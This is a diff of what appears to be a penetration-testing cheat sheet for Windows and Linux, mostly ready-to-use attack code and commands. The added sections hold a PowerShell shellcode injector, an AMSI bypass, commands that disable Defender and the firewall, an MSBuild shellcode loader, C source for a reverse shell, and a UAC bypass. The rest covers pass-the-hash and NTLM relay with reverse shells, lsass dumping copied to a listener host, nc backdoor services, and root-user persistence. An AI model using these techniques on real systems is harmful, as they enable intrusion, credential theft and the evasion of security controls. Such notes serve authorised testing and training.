+# run the exploit
+./RoguePotato.exe -l 9999 -e "C:\Users\Public\revshell.exe" -r LISTEN_IP
+# and bingo! you should have system on the listener you set up!
+```
+
+## 5.3 Antivirus & Firewall Evasion
+
+Advanced Evasion techniques:
+
+- https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/
+- https://web.archive.org/web/20210317102554/https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf
+
+### 5.3.1 Cross-Compiling Windows Binaries on Linux
 
 You can use `mingw` to cross-compile C files.
 
@@ -3608,90 +3744,337 @@ wine syncbreeze_exploit.exe
 
 
 
-## 5.8 Lateral Movement in Windows Active Directory
+### 5.3.2 Shellter
 
+You can use `shellter` to inject a malicious payload into a legitimate Windows 32-bit executable. Just run `shellter` in the terminal and follow the prompts. Recommend using `stealth` mode so it doesn't alert the user. The paid version of `shellter` supports 64-bit executables.
 
-
-### 5.8.1 Windows Pass-The-Hash Attacks
-
-There are lots of ways to pass the hash on windows, giving you access as a user
-with just the hash of their creds.
-
-See [Grabbing Hashes from Windows](#5.10.5%20Grabbing%20Hashes%20from%20Windows) for techniques on grabbing Windows password hashes.
-
-Note: Windows NTLM hashes are in the form LMHASH:NTHASH. That convention is used here.
+To check that your exploit works:
 
 ```sh
-# Get remote powershell shell by passing the hash
-# install: sudo gem install evil-winrm
-evil-winrm.rb -i $VICTIM_IP -u username -H NTHASH
+# start listener for reverse shell
+sudo nc -lvnp 443
 
-# Run remote command as SYSTEM (note colon before NT hash)
-impacket-psexec -hashes :NTHASH [DOMAIN/]administrator@$VICTIM_IP [whoami]
-# omit the command to get interactive shell
-
-# Run remote command as Administrator; same syntax as psexec
-impacket-wmiexec -hashes :NTHASH [DOMAIN/]Administrator@$VICTIM_IP
-
-# execute remote command as Admin (IP MUST GO LAST!)
-crackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami $VICTIM_IP
-
-# spawn cmd.exe shell on remote windows box
-# replace 'admin' with username, 'hash' with full LM-NTLM hash (colon-separated)
-pth-winexe -U 'admin%hash' //WINBOX_IP cmd.exe
-
-# other options for PtH: xfreerdp, smbclient
+# run shellter-injected binary with wine
+wine derp.exe
 ```
 
-
-### 5.8.2 Windows NTLMv2 Hash Relay Attack
-
-When you can't crack an NTLMv2 hash that you were able to capture with Responder, you can relay it to another machine for access/RCE (assuming it's an admin hash, and Remote UAC restrictions are disabled on the target). If this works, you get instant SYSTEM on the remote machine.
-
-```sh
-# '-c' flag is command to run
-# here we are generating a powershell reverse shell one-liner
-# as base64-encoded command
-sudo impacket-ntlmrelayx -t VICTIM_IP -no-http-server -smb2support -c "powershell -enc $(msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=LISTEN_IP | iconv -t UTF-16LE | base64 | tr -d '\n')"
-
-# start a netcat listener to catch the reverse shell
-sudo nc -nvlp 443
-```
+**NOTE:** I've had issues using the binaries under `/usr/share/windows-resources/binaries/`, so download something like PuTTY from the internet instead. Make sure you get the 32-bit version of whatever binary you grab.
 
 
-### 5.8.3 Windows Token Impersonation
 
-These require the `SeImpersonatePrivilege` or `SeAssignprimaryTokenPrivilege` to
-be enabled. This is the case when you have a shell running as
-`NT AUTHORITY\LOCAL SERVICE`
+### 5.3.3 Windows Process Injection
 
-### 5.8.4 Windows Token Impersonation with RoguePotato
+The general technique for injecting shellcode into another (running) process goes like this:
 
-```sh
-# on kali box, set up socat redirector for roguepotato to bounce off of
-sudo socat tcp-listen:135,reuseaddr,fork tcp:WINBOX_IP:9999
-# also start another netcat listener to catch the system shell
-sudo nc -vlnp 443
-```
+1. ***OpenProcess*** - Get a HANDLE to a target process that you have permissions to access
+2. ***VirtualAllocEx*** - Allocate memory within the target process
+3. ***WriteProcessMemory*** - Copy your shellcode into the target process's memory
+4. ***CreateRemoteThread*** - Start execution of your shellcode in new thread running within target process
+
+These are the most common Windows APIs used to accomplish this, but there are [many other alternatives](https://malapi.io/).
+
+Here is a PowerShell implementation of a simple "process injector" that injects the shellcode into itself and runs it:
 
 ```powershell
-# in windows reverse shell with "SeImpersonatePrivilege"
-# or "SeAssignPrimaryTokenPrivilege" enabled
-RoguePotato.exe -r KALI_IP -e "C:\Users\Public\revshell.exe" -l 9999
-# and bingo! you should have system on the listener you set up!
+$imports = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+$w = Add-Type -memberDefinition $imports -Name "derp" -namespace Win32Functions -passthru;
+
+# msfvenom -p windows/shell_reverse_tcp -f powershell -v s LPORT=443 LHOST=LISTEN_IP
+[Byte[]];
+[Byte[]]$s = <SHELLCODE HERE>;
+
+$size = 0x1000;
+
+if ($s.Length -gt 0x1000) {$size = $s.Length};
+
+$x = $w::VirtualAlloc(0,$size,0x3000,0x40);
+
+for ($i=0;$i -le ($s.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $s[$i], 1)};
+
+$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 ```
 
-### 5.8.5 Windows Token Impersonation with PrintSpoofer
 
-First set up a netcat listener on Kali to catch the reverse shell.
+
+### 5.3.4 Windows AMSI Bypass
+
+This one-liner lets you get past Windows' Antimalware Scan Interface (AMSI), which
+will e.g. block malicious powershell scripts from running. If you get a warning
+saying something like "This script contains malicious content and has been blocked
+by your antivirus software", then run this command to disable that blocker.
 
 ```powershell
-# on windows reverse shell with "SeImpersonatePrivilege"
-# or "SeAssignPrimaryTokenPrivilege" enabled
-PrintSpoofer.exe -c "C:\Users\Public\revshell.exe" -i
+$a=[Ref].Assembly.GetTypes();foreach($b in $a){if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
 ```
 
-### 5.8.6 Quick Active Directory Enumeration
+Other bypasses available through nishang's [Invoke-AMSIBypass](https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1).
+
+
+
+### 5.3.5 Turn off Windows Firewall
+
+```powershell
+# must be done from administrator prompt
+# Disable Windows firewall on newer Windows:
+netsh advfirewall set allprofiles state off
+
+# Disable Windows firewall on older Windows:
+netsh firewall set opmode disable
+```
+
+
+
+### 5.3.6 Turn off Windows Defender
+
+```powershell
+# must be running powershell as Administrator
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# for completely removing Windows Defender (until next Windows update)
+Uninstall-WindowsFeature -Name Windows-Defender
+```
+
+Alternatively, you should be able to do it with services:
+
+```powershell
+sc config WinDefend start= disabled
+sc stop WinDefend
+
+# to restart Defender
+sc config WinDefend start= auto
+sc start WinDefend
+```
+
+I think you can even disable it with Registry keys:
+
+```powershell
+reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t DWORD /d 1 /f
+
+# more granular controls
+reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableBehaviorMonitoring /t DWORD /d 1 /f
+reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableOnAccessProtection /t DWORD /d 1 /f
+reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableScanOnRealtimeEnable /t DWORD /d 1 /f
+
+# then reboot for changes to take effect
+```
+
+
+
+### 5.3.7 Windows Encoding/Decoding with LOLBAS
+
+```powershell
+# base64 encode a file
+certutil -encode inputFileName encodedOutputFileName
+# base64 decode a file
+certutil -decode encodedInputFileName decodedOutputFileName
+# hex decode a file
+certutil --decodehex encoded_hexadecimal_InputFileName
+# MD5 checksum
+certutil -hashfile somefile.txt MD5
+```
+
+
+
+### 5.3.8 Execute Inline Tasks with MSBuild.exe
+
+MSBuild is built into Windows .NET framework, and it lets you execute arbitrary
+C#/.NET code inline. Modify the XML file below with your shellcode from
+msfvenom's "-f csharp" format (or build a payload with Empire's
+windows/launcher_xml stager, or write your own C# and host over SMB)
+
+To build:
+```powershell
+# locate MSBuild executables
+dir /b /s C:\msbuild.exe
+
+# execute 32-bit shellcode
+C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml
+
+# execute 64-bit shellcode
+C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe  payload.xml
+```
+
+Here's the payload.xml template to inject your shellcode into (if not building
+with Empire)
+
+```xml
+<!-- This is 32-bit. To make 64-bit, swap all UInt32's for UInt64, use 64-bit
+     shellcode, and build with 64-bit MSBuild.exe
+     Building Shellcode:
+     msfvenom -p windows/shell_reverse_tcp -f csharp lport=443 lhost=YOUR_IP | tee shellcode.cs
+-->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes shellcode. -->
+  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
+  <!-- Save This File And Execute The Above Command -->
+  <!-- Author: Casey Smith, Twitter: @subTee -->
+  <!-- License: BSD 3-Clause -->
+  <Target Name="Hello">
+    <ClassExample />
+  </Target>
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+
+      <Code Type="Class" Language="cs">
+      <!-- to host code remotely, instead use:
+      <Code Type="Class" Language="cs" Source="\\ATTACKER_IP\share\source.cs">
+      -->
+      <![CDATA[
+        using System;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        public class ClassExample :  Task, ITask
+        {
+          private static UInt32 MEM_COMMIT = 0x1000;
+          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+          [DllImport("kernel32")]
+            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+          [DllImport("kernel32")]
+            private static extern IntPtr CreateThread(
+            UInt32 lpThreadAttributes,
+            UInt32 dwStackSize,
+            UInt32 lpStartAddress,
+            IntPtr param,
+            UInt32 dwCreationFlags,
+            ref UInt32 lpThreadId
+            );
+          [DllImport("kernel32")]
+            private static extern UInt32 WaitForSingleObject(
+            IntPtr hHandle,
+            UInt32 dwMilliseconds
+            );
+          public override bool Execute()
+          {
+            //PUT YOUR SHELLCODE HERE;
+
+            UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
+            IntPtr hThread = IntPtr.Zero;
+            UInt32 threadId = 0;
+            IntPtr pinfo = IntPtr.Zero;
+            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+            return true;
+          }
+        }
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+```
+
+
+
+### 5.3.9 Custom Windows TCP Reverse Shell
+
+A custom reverse shell can often get past antivirus.
+
+```c
+/* Win32 TCP reverse cmd.exe shell
+ * References:
+ * https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-htons
+ * https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
+ * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
+ * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
+ * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
+ * https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)
+ */
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+// CHANGE THESE
+#define TARGET_IP   "LISTEN_IP"
+#define TARGET_PORT 443
+
+void main(void) {
+  SOCKET s;
+  WSADATA wsa;
+  STARTUPINFO si;
+  struct sockaddr_in sa;
+  PROCESS_INFORMATION pi;
+
+  WSAStartup(MAKEWORD(2,2), &wsa);
+  s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+  sa.sin_family = AF_INET;
+  sa.sin_addr.s_addr = inet_addr(TARGET_IP);
+  sa.sin_port = htons(TARGET_PORT);
+  WSAConnect(s, (struct sockaddr *)&sa, sizeof(sa), NULL, NULL, NULL, NULL);
+  SecureZeroMemory(&si, sizeof(si));
+  si.cb = sizeof(si);
+  si.dwFlags = STARTF_USESTDHANDLES;
+  si.hStdInput = (HANDLE)s;
+  si.hStdOutput = (HANDLE)s;
+  si.hStdError = (HANDLE)s;
+  CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+}
+```
+
+To compile on Kali (as 32-bit binary because it works on both 32- and 64-bit):
+
+```sh
+sudo dpkg --add-architecture i386
+sudo apt update
+sudo apt install mingw-w64 wine
+i686-w64-mingw32-gcc rsh.c -o rsh.exe -s -lws2_32
+```
+
+
+
+### 5.3.10 Windows UAC Bypass
+
+Only the local "Administrator" user can perform admin actions without any User Account Control (UAC) restrictions. All other admin user accounts must normally pass UAC checks to perform admin actions, unless UAC is disabled.
+
+UAC Enabled registry key (can only modify as admin):
+
+``` powershell
+# Disabling UAC via registry:
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /f /d 0
+
+# Enabling UAC:
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t DWORD /f /d 1
+```
+
+Bypass Technique:
+
+```powershell
+# Ref: https://mobile.twitter.com/xxByte/status/1381978562643824644
+New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
+New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+fodhelper
+
+# To undo:
+Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+```
+
+
+
+## 5.4 Lateral Movement in Windows Active Directory
+
+
+
+### 5.4.1 Quick Active Directory Enumeration
 
 This script will provide a quick listing of all computers, users, service
 accounts, groups and memberships on an Active Directory domain.
@@ -3734,14 +4117,61 @@ $s.FindAll()|?{_r $_ $m | out-null};
 $m|sort-object OU -unique|?{write-host ([string]::Format("[OU] {0}: {1}",$_.OU,$_.M))};
 ```
 
-## 5.9 Windows Passwords & Hashes
+### 5.4.2 Windows Pass-The-Hash Attacks
+
+There are lots of ways to pass the hash on windows, giving you access as a user
+with just the hash of their creds.
+
+See [Grabbing Hashes from Windows](#5.10.5%20Grabbing%20Hashes%20from%20Windows) for techniques on grabbing Windows password hashes.
+
+Note: Windows NTLM hashes are in the form LMHASH:NTHASH. That convention is used here.
+
+```sh
+# Get remote powershell shell by passing the hash
+# install: sudo gem install evil-winrm
+evil-winrm.rb -i $VICTIM_IP -u username -H NTHASH
+
+# Run remote command as SYSTEM (note colon before NT hash)
+impacket-psexec -hashes :NTHASH [DOMAIN/]administrator@$VICTIM_IP [whoami]
+# omit the command to get interactive shell
+
+# Run remote command as Administrator; same syntax as psexec
+impacket-wmiexec -hashes :NTHASH [DOMAIN/]Administrator@$VICTIM_IP
+
+# execute remote command as Admin (IP MUST GO LAST!)
+crackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami $VICTIM_IP
+
+# spawn cmd.exe shell on remote windows box
+# replace 'admin' with username, 'hash' with full LM-NTLM hash (colon-separated)
+pth-winexe -U 'admin%hash' //WINBOX_IP cmd.exe
+
+# other options for PtH: xfreerdp, smbclient
+```
+
+
+### 5.4.3 Windows NTLMv2 Hash Relay Attack
+
+When you can't crack an NTLMv2 hash that you were able to capture with Responder, you can relay it to another machine for access/RCE (assuming it's an admin hash, and Remote UAC restrictions are disabled on the target). If this works, you get instant SYSTEM on the remote machine.
+
+```sh
+# '-c' flag is command to run
+# here we are generating a powershell reverse shell one-liner
+# as base64-encoded command
+sudo impacket-ntlmrelayx -t VICTIM_IP -no-http-server -smb2support -c "powershell -enc $(msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=LISTEN_IP | iconv -t UTF-16LE | base64 | tr -d '\n')"
+
+# start a netcat listener to catch the reverse shell
+sudo nc -nvlp 443
+```
+
+
+## 5.5 Windows Passwords & Hashes
 
 Windows NTLM hashes are in the form LMHASH:NTHASH. That convention is used here.
 
 Encrypted passwords can often be recovered with tools like [NirSoft](http://www.nirsoft.net/password_recovery_tools.html)
 
 
-### 5.9.1 Windows Passwords in Files
+### 5.5.1 Windows Passwords in Files
 
 Some of these passwords are cleartext, others are base64-encoded. Groups.xml has
 an AES-encrypted password, but the static key is published on the MSDN website.
@@ -3776,7 +4206,7 @@ To decrypt the Groups.xml password: `gpp-decrypt encryptedpassword`
 ```
 
 
-#### 5.9.1.1 Finding Passwords in Windows Files
+**Finding Passwords in Windows Files**:
 
 ```powershell
 # search specific filetypes for "password"
@@ -3791,7 +4221,8 @@ dir /b /s *passw* *creds* *credential*
 dir /b /s *.config *.conf *.cfg
 ```
 
-### 5.9.2 Windows Passwords in Registry
+
+### 5.5.2 Windows Passwords in Registry
 
 ```powershell
 # Windows autologin credentials (32-bit and 64-bit versions)
@@ -3813,24 +4244,26 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
-### 5.9.3 Wifi Passwords Saved on Windows
+**Wifi Passwords Saved on Windows**:
 
 ```powershell
 # show all saved wifi networks
 netsh wlan show profiles
 
-# get password of specific network 'profilename'
-wlan show profile profilename key=clear
+# get password of specific network 'WIFINAME'
+wlan show profile WIFINAME key=clear
 
 # PEAP wifi network passwords are stored in registry
-reg save 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hklm.hiv
-reg save 'HKCU\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hkcu.hiv
-
 # Display all keys, values and data under the PEAP profiles:
 reg query 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *
+reg query 'HKCU\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *
+
+# Save the passwords in registry to a file
+reg save 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hklm.hiv
+reg save 'HKCU\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hkcu.hiv
 ```
 
-### 5.9.4 Grabbing Hashes from Windows
+### 5.5.3 Grabbing Hashes from Windows
 
 ```powershell
 # Grab them from the registry
@@ -3865,7 +4298,7 @@ procdump64.exe -accepteula -ma lsass.exe %TEMP%\lsass.mem
 copy %TEMP%\lsass.mem \\LISTEN_IP\share
 ```
 
-#### 5.9.4.1 Dumping Hashes from Windows Registry Backups
+#### 5.5.3.1 Dumping Hashes from Windows Registry Backups
 
 Look for these files:
 
@@ -3883,7 +4316,7 @@ Look for these files:
 %SYSTEMROOT%\ntds\ntds.dit
 ```
 
-#### 5.9.4.2 Dumping Hashes from Windows Domain Controller
+#### 5.5.3.2 Dumping Hashes from Windows Domain Controller
 
 DCSync Attack
 
@@ -3892,7 +4325,7 @@ DCSync Attack
 impacket-secretsdump -just-dc-ntlm -outputfile secretsdump DOMAIN/username:Password@DC_IP_or_FQDN
 ```
 
-#### 5.9.4.3 Grab NTLMv2 Hashes Using Responder
+#### 5.5.3.3 Grab NTLMv2 Hashes Using Responder
 
 Note: In addition to SMB, [Responder](https://github.com/lgandx/Responder) also includes other protocol servers (including HTTP and FTP) as well as poisoning capabilities for Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS).
 
@@ -3939,7 +4372,7 @@ hashcat -m 5600 responder.hash /usr/share/wordlists/rockyou.txt --force
 ```
 
 
-#### 5.9.4.4 Dump Hashes and Passwords Using mimikatz
+#### 5.5.3.4 Dump Hashes and Passwords Using mimikatz
 
 [PayloadsAllTheThings: Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
 
@@ -3974,7 +4407,7 @@ dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\
 ```
 
 
-## 5.10 Miscellaneous Windows Commands
+## 5.6 Miscellaneous Windows Commands
 
 cmd.exe:
 
@@ -4050,13 +4483,13 @@ Add-Type -A 'System.IO.Compression.FileSystem';
 Compress-Archive -Path 'C:\folder' -DestinationPath 'C:\output.zip'
 ```
 
-## 5.11 Windows Persistence
+## 5.7 Windows Persistence
 
-### 5.11.1 Remote SYSTEM Backdoor
+### 5.7.1 Remote SYSTEM Backdoor
 
 These techniques require having Admin credentials for the target machine.
 
-#### 5.11.1.1 Backdoor Windows Services
+#### 5.7.1.1 Backdoor Windows Services
 
 Services give you SYSTEM access.
 
@@ -4078,7 +4511,7 @@ net start derp
 sc \\VICTIM_NAME delete derp
 ```
 
-#### 5.11.1.2 Backdoor Service with PSExec
+#### 5.7.1.2 Backdoor Service with PSExec
 
 Alternate way to create a backdoor service. Services give you SYSTEM access.
 
@@ -4097,7 +4530,7 @@ psexec \\VICTIM_IP -c -s -d -u Administrator -p password "nc.exe -n ATTACKER_IP 
 # the remote machine.
 ```
 
-#### 5.11.1.3 Backdoor Scheduled Tasks
+#### 5.7.1.3 Backdoor Scheduled Tasks
 
 Scheduled Tasks normally give you Administrator access, but you can use `/ru system` to make them give you SYSTEM access.
 
@@ -4119,7 +4552,7 @@ at \\VICTIM_IP HH:MM[A|P] COMMAND
 at \\VICTIM_IP
 ```
 
-### 5.11.2 Backdoor via WMIC
+### 5.7.2 Backdoor via WMIC
 
 WMIC creates a remote process running with Administrator privileges. It's a non-persistent backdoor (doesn't survive restarts).
 
@@ -4131,7 +4564,7 @@ wmic process call create "%temp%\nc.exe -dlp 22222 -e cmd.exe"
 wmic process where name="nc.exe" delete
 ```
 
-### 5.11.3 Add RDP User
+### 5.7.3 Add RDP User
 
 ```powershell
 net user derp herpaderp /add
@@ -4145,7 +4578,7 @@ net user derp /del
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
 ```
 
-#### 5.11.3.1 Connect to Windows RDP
+**Connecting via RDP:**
 
 ```sh
 xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:$VICTIM_IP
@@ -4153,7 +4586,7 @@ xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680
 # /drive:derp,/path/to/share
 ```
 
-### 5.11.4 Change Windows Domain Credentials
+### 5.7.4 Change Windows Domain Credentials
 
 If you want to change the password of a user on a windows domain:
 
@@ -4163,7 +4596,7 @@ Set-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -A
 
 
 
-## 5.12 Windows Files of Interest
+## 5.8 Windows Files of Interest
 
 ```powershell
 # GPG keys
@@ -4181,7 +4614,7 @@ powershell -c "Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse 
 # passwords.txt has default creds
 
 # User files
-powershell -c "Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue"
+powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*pst,*.ost,*.eml,*.msg -File -Recurse -ErrorAction SilentlyContinue"
 ```
 
 # 6 Linux
@@ -4406,7 +4839,7 @@ cat /etc/motd
 getenforce
 ```
 
-## 6.3 Watching for Linux Process Changes
+### 6.2.1 Watching for Linux Process Changes
 
 ```sh
 #!/bin/bash
@@ -4425,27 +4858,13 @@ while true; do
 done
 ```
 
-## 6.4 Adding root user to /etc/shadow or /etc/passwd
 
-```sh
-# if /etc/shadow is writable
-# generate new password
-mkpasswd -m sha-512 password
-# or
-openssl passwd -1 -salt derp password
-# edit /etc/shadow and overwrite hash of root with this one
+## 6.3 Linux Privilege Escalation
 
-# if /etc/passwd is writable
-echo "derp:$(mkpasswd -m sha-512 password):0:0:root:/root:/bin/bash" >> /etc/passwd
-# alternatively
-echo "derp:$(openssl passwd -1 -salt derp password):0:0:root:/root:/bin/bash" >> /etc/passwd
-# pre-computed for password 'herpaderp':
-echo 'derp:$5$derp$uEWQFRg/9idrisiL6SgLNfSAv3.UNCc7eHUv.L1Wlo.:0:0:root:/root:/bin/bash' >> /etc/passwd
+So many options at [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 
-# can also add generated password between the first and second colon of root user
-```
 
-## 6.5 Escalating via sudo binaries
+### 6.3.1 Escalating via sudo binaries
 
 Many binaries let you run commands from within them. If you get limited `sudo`
 permissions for one of the binaries, you can escalate to root.
@@ -4464,7 +4883,7 @@ sudo awk 'BEGIN {system("/bin/sh")}'
 sudo find . -exec /bin/sh \; -quit
 ```
 
-## 6.6 LD_PRELOAD and LD_LIBRARY_PATH
+### 6.3.2 LD_PRELOAD and LD_LIBRARY_PATH
 
 For this to work, `sudo -l` must show that either LD_PRELOAD or LD_LIBRARY_PATH
 are inherited from the user's environment:
@@ -4526,7 +4945,7 @@ sudo LD_LIBRARY_PATH=/tmp apache2
 # being called (must exactly match function signature)
 ```
 
-## 6.7 SUID binaries
+### 6.3.3 Hijacking SUID binaries
 
 `inject.c`:
 ```c
@@ -4548,7 +4967,7 @@ void inject() {
 # find all root-owned SUID and GUID binaries
 find / -type f \( -perm -g+s -a -gid 0 \) -o \( -perm -u+s -a -uid 0 \) -ls 2>/dev/null
 
-# look for access to file that doesn't exist, but we might control
+# look for access to shared object that doesn't exist, but we might control
 strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
 
 # compile your inject file
@@ -4601,13 +5020,13 @@ export -f /usr/sbin/service
 ```
 
 For bash versions less than 4.4, you can also take advantage of the PS4 env var,
-which is used to display debug information (debug mode when SHELLOPTS=xtrace).
+which is used to display debug information (debug mode when `SHELLOPTS=xtrace`).
 
 ```sh
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
 ```
 
-## 6.8 Using NFS for Privilege Escalation
+### 6.3.4 Using NFS for Privilege Escalation
 
 NFS Shares inherit the **remote** user ID, so if root-squashing is disabled,
 something owned by root remotely is owned by root locally.
@@ -4628,7 +5047,7 @@ chmod +xs /tmp/nfs/shell.elf
 /tmp/shell.elf
 ```
 
-## 6.9 Using Docker for Privesc
+### 6.3.5 Using Docker for Privesc
 
 This is possible when the user is a member of the `docker` group.
 
@@ -4641,9 +5060,9 @@ docker run --rm -it -v /:/mnt --privileged ubuntu bash
 From there, add your ssh key to `/mnt/root/.ssh/authorized_keys` or update the
 `/mnt/etc/passwd` file to include an additional malicious root user.
 
-## 6.10 Linux Kernel Exploits
+### 6.3.6 Linux Kernel Exploits
 
-### 6.10.1 Dirty Cow Linux Privesc
+#### 6.3.6.1 Dirty Cow Linux Privesc
 
 [CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5195)
 is effective against Linux kernels 2.x through 4.x before 4.8.3.
@@ -4658,12 +5077,51 @@ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 searchsploit -m 40839
 ```
 
-## 6.11 Data Wrangling on Linux
+## 6.4 Linux Persistence
+
+### 6.4.1 Adding root user to /etc/shadow or /etc/passwd
+
+```sh
+# if /etc/shadow is writable
+# generate new password
+mkpasswd -m sha-512 password
+# or
+openssl passwd -1 -salt derp password
+# edit /etc/shadow and overwrite hash of root with this one
+
+# if /etc/passwd is writable
+echo "derp:$(mkpasswd -m sha-512 password):0:0:root:/root:/bin/bash" >> /etc/passwd
+# alternatively
+echo "derp:$(openssl passwd -1 -salt derp password):0:0:root:/root:/bin/bash" >> /etc/passwd
+# pre-computed for password 'herpaderp':
+echo 'derp:$5$derp$uEWQFRg/9idrisiL6SgLNfSAv3.UNCc7eHUv.L1Wlo.:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# can also add generated password between the first and second colon of root user
+```
+
+### 6.4.2 Grant passwordless sudo access
+
+Edit the `/etc/sudoers` file to have the following line:
+
+```
+myuser ALL=(ALL) NOPASSWD: ALL
+```
+
+### 6.4.3 Setting SUID bit
+
+If you set the SUID bit of a root-owned executable, like `/bin/sh` or `less`
